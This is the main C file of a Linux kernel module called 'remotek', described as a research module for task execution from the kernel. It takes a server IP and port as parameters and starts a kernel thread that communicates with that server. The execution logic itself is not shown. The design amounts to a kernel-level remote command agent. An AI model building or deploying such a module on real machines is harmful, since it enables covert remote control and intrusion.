#include "exec.h"
#include "globals.h"
#include "network.h"

#include <linux/module.h>

#include <linux/inet.h>
#include <linux/kthread.h>
#include <linux/net.h>

#define BUF_SIZE 1025

struct globals *global = NULL;
struct task_struct *thread_client = NULL;
struct socket *sock = NULL;
char *ip = "127.0.0.1";
int port = 4242;
module_param(ip, charp, 0644);
module_param(port, int, 0644);
MODULE_PARM_DESC(ip, "Server IPv4");
MODULE_PARM_DESC(port, "Server port");

static __init int remote_init(void)
{
    pr_info("remotek: insmoded\n");

    global = kmalloc(sizeof (struct globals), GFP_KERNEL);

    global->ip = ip;
    global->port = port;
    global->sock = sock;
    global->thread = thread_client;

    thread_client = kthread_run(communicate, global, "remotek");


    if (IS_ERR(thread_client))
    {
        pr_err("remotek: failed to create a thread\n");
        return PTR_ERR(thread_client);
    }

    pr_info("remotek: thread started\n");
    return 0;
}


static void __exit remote_exit(void)
{
    if (thread_client)
    {
        kthread_stop(thread_client);
        pr_info("remotek: thread stopped\n");
    }

    if (sock)
        sock_release(sock);

    kfree(global);

    pr_info("remotek: rmmoded\n");
}


module_init(remote_init);
module_exit(remote_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Gelules");
MODULE_VERSION("0.1");
MODULE_DESCRIPTION("REMOTEK: Research Environment MOdule for Operational Task Execution from Kernel");
